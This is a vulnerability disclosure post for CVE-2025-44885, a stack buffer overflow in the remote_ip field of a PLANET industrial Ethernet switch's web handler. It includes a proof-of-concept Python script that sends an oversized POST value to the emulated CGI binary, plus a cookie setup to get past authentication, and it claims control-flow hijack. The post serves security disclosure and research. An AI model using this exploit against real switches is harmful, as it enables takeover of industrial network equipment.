---
title: web_snmpv3_remote_engineId_add_post_remote_ip
date: 2025-04-20 17:10:00
tags: cve
---





**Affected Product**: FW-WGS-804HPT

**Affected Firmware Versions**:  v1.305b241111

**Vulnerability Type**: Buffer Overflow

**CVE Identifier**: CVE-2025-44885





# FW-WGS-804HPT_v1.305b241111 introduced

The WGS-804HPT-V2 is a ruggedized industrial-grade Ethernet switch designed for harsh environments and mission-critical applications. As part of PLANET Technology's Industrial Automation Series, this 8-port managed switch combines Power over Ethernet (PoE+) capabilities with industrial durability, making it ideal for building automation, smart infrastructure, and IoT deployments.



Official Product Page: https://www.planet.com.tw/en/product/wgs-804hpt-v2



# web_snmpv3_remote_engineId_add_post_remote_ip

 I discovered a  stack overflow vulnerability in the Planet router.

By analyzing the dispatcher file in the bin directory, I found that the function web_snmpv3_remote_engineId_add_post  contains a stack overflow vulnerability.

The stack overflow can be triggered by remote_ip value, which leads to a memcpy stack overflow.

![image-20250321152223389](../res/202503211522484-17451404561846.png)

In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of "20 0 0", and its function is to create a cookie with sufficient permissions to access this route.

```json
20 0 0
```



![image-20250417110630394](res/image-20250417110630394-17448591915039.png)

![image-20250417110648157](../res/image-20250417110648157-174485920924110-17451404561845.png)





![image-20250417110742170](res/image-20250417110742170-174485926377311.png)



Through IDA, it can be seen that the stack space is 0x178

﻿The content of the **poc**.py file is as follows:

```json
import os


a = 0x1017
var_name = "remote_ip"
b = 'a' * 0x300


poc_content = f"&cmd={a}&{var_name}={b}"
with open('poc', 'w') as f:
    f.write(poc_content)

command = (
    "sudo chroot . ./qemu-mips-static "
    "-E REQUEST_METHOD=POST "
    "-E HTTP_COOKIE='hid=0' "
    "-L ./lib "
    "-g 1234 "
    "./dispatcher.cgi "
    "< poc"  
)


os.system(command)




```



![image-20250417110813345](../res/image-20250417110813345-174485929505312-17451404561847.png)

![image-20250417110857449](../res/image-20250417110857449-174485933854013.png)



Through the above image, we can see that we have overflowed to 0x260 and successfully hijacked the control flow. If necessary, more can be overflowed.
